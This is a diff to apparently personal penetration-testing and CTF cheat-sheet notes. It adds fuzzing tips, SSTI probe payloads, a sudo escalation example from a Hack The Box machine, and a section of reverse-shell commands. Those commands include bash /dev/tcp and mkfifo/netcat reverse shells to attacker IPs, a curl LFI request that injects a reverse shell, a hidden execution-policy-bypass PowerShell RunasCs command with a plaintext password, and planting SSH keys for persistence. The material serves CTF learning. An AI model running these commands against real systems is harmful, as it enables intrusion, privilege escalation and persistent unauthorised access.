@@ -17,15 +17,22 @@
 	- [ ] Common.txt
 	- [ ] raft-files
 	- [ ] raft directory
+	- [ ] 
 	- [ ] For the Subdomains,VHOSTs and for the http ports 
 	- [ ] Infrastructure Based fuzz
-		- [ ] php
+		- [ ] php - > `ffuf with -e .php`
 		- [ ] wordpress
 	- [ ] Custom Wordlist
 		- [ ] If there is some pages. - `cewl`
 - [ ] BruteForce logins
 	- [ ] Seclists
+	- [ ] Password Reuse, sql password can be users
 	- [ ] Custom Wordlists.
+
+
+to run powershell on cmd - `powershell -NoP -NonI -W Hidden -Exec Bypass -Command Invoke-RunasCs.ps1 -Username Administrator -Password 'moonshine1' -Command type C:\Users\Administrator\root.txt`
+- For static binary
+	- https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
 ## Web CTF
 ### A) File Inclusion / path traversal
 - IF the site have file opening method like => ...?home=about
@@ -72,9 +79,14 @@
       - change the accept-language to the hints.
 
 ### I) SSTI
-## Identification Phase
-Identifying the template engine involves analyzing error messages or manually testing various language-specific payloads. Common payloads causing errors include `${7/0}`, `{{7/0}}`, and `<%= 7/0 %>`. Observing the server's response to mathematical operations helps pinpoint the specific template engine.
-  
+Identifying the template engine involves analyzing error messages or manually testing various language-specific payloads. Common payloads causing errors include `${7/0}`, `{{7/0}}`, and `<%= 7/0 %>`.
+>[!success] testing payload ` ${{<%[%'"}}%\ `
+
+Observing the server's response to mathematical operations helps pinpoint the specific template engine.
+## Intercepting Requests.
+- If you have programs those are made with some kinds express or node, they will send web requests so,
+	- You can intercept and watch it on `BURPSUITE` too.
+- If the program sends LDAP or another requests u need wireshark.
 ## Git CTF
 - get the .git link
 - download it with gitdumper.sh
@@ -260,15 +272,32 @@ root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
 root
 ```
 - If you got `(ALL) ALL` just escalate it with `sudo su` u pass with no password.
+- Some times you can get something like `(ALL, !root)`
+```shell
+hugo@blunder:~$ sudo -l
+Password:
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+hugo@blunder:~$ sudo /bin/bash
+Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
+
+hugo@blunder:~$ sudo -u shaun /bin/bash
+shaun@blunder:/home/hugo$
+```
 #### 10) Exposed Credentials
 - we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us
 - They can be found in
 	- Database files
 	- Php files
+- To remove passphrase from id_rsa file if u have the passphrase
+	- `openssl rsa -in dorthi.pem -out id_rsa.pem`
 ## Reverse Shells - commands
 ### bash Reverse Shell
-- `bash -i >& /dev/tcp/10.10.16.22/4443 0>&1`	  
-- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.125 4444 >/tmp/f`
+- `bash -i >& /dev/tcp/10.10.14.36/8003 0>&1`	  
+- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 8003 >/tmp/f`
 ```shell
 # If it is on LFI
 curl http://10.10.10.150/index.php -G --data-urlencode 'pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f '
@@ -392,6 +421,7 @@ www-data@remotehost$
 - we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user
 	- We Create Key `ssh-keygen`
 	- we will copy our `.pub` to victims `.ssh` folder and we will use `-i` with our private key on our computer
+- `stty sane ;  stty rows 67 columns 116 ;  export TERM='xterm' ; export PS1='$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")'`
 ## Spawning Interactive Shell
 ### Perl
 ```shell
